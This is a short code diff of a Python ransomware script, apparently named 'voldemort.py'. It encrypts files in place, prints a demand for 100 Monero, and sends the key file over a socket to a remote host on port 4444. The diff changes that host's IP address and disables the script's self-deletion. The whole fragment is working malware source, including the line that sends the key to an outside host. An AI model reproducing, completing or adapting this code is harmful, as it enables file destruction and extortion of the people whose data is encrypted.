@@ -29,6 +29,7 @@ for file in files:
     with open(file, "wb") as f:
         f.write(data_encrypted)
 print("All files encrypted! Send me 100 Monero(XMR) to my wallet(WALLET)")
+
 def send_file_to_host(file_path, host, port):
     with open(file_path, 'rb') as file:
         data = file.read()
@@ -38,6 +39,6 @@ def send_file_to_host(file_path, host, port):
         s.sendall(data)
 
 # Usage:
-send_file_to_host('key.key', '192.168.1.2', 4444)
+send_file_to_host('key.key', '172.22.9.204', 4444)
 #Delete the randsomware
-os.remove("voldemort.py")
+#os.remove("voldemort.py")
